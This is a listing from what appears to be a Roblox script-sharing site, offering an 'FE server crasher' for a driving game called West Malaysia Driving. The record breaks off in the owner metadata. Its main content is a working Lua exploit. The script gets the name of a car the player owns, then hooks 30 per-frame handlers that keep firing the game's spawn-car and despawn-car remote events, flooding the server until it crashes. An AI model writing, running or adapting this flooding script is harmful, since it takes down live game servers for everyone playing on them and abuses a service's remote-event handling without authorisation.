{"slug":"(JDM-CARS+CUSTOM-RIM)West-Malaysia-Driving-OPEN-SOURCE-FE-server-crasher-72627","_id":"6932ab63948ab6f2c0839546","title":"OPEN SOURCE FE server crasher","game":{"_id":"6932ab62948ab6f2c0839543","gameId":80345480120619,"name":"(JDM CARS+CUSTOM RIM)West Malaysia Driving","imageUrl":{"url":"https://cdn.kocakz.me/images/no-game.webp","original":null},"thumbnail":{"url":"https://cdn.kocakz.me/images/no-game.webp","original":null},"placeId":80345480120619},"features":"CRASH SERVER","tags":["server crasher","FE"],"script":"-- @build-failed\n-- crash server\n-- need at least one car in the garage to crash the server\n\nlocal runservice = game:GetService(\"RunService\")\nlocal replicatedstorage = game:GetService(\"ReplicatedStorage\")\n\nlocal SpawnCarEvent = replicatedstorage:WaitForChild(\"SpawnCarEvents\"):WaitForChild(\"SpawnCar\")\nlocal DespawnCarEvent = replicatedstorage:WaitForChild(\"SpawnCarEvents\"):WaitForChild(\"DespawnCar\")\nlocal InitializeCarDataEvent = replicatedstorage:WaitForChild(\"DealershipEvents\"):WaitForChild(\"InitializeCarData\")\n\n-- get a random owned car name\nlocal response = InitializeCarDataEvent:InvokeServer()\nlocal carName = nil\n\nfor _, data in response do\n    if not data or not data.CarName then continue end\n    carName = data.CarName\n    break\nend\n\n-- event --\nfor i = 1, 30 do\n    runservice.Heartbeat:Connect(function()\n        SpawnCarEvent:FireServer(carName)\n        DespawnCarEvent:FireServer()\n    end)\nend\n","owner":{"_id":"69295f649aebc6b6d35f1e1f","username":"build_failed","verified":false,"profilePicture":{"url":"https://cdn.kocakz.me/images/82a4939e39b35775fb88a91454596042e116701bfdd88636c588a5150408bfea.webp","original":"https://scriptblox.com/images/photo/69295f649aebc6b6d35f1e1f-1766508866434.png"},"lvl":13,"status":"offline","id":"69295f649aebc6b6d35f1e1f","topMilestone":{"key":"creator.scripts","tier":25},"profile":{"url":"https://cdn.kocakz.me/images/82a4939e39b35775fb88a91454596042e116701bfdd88636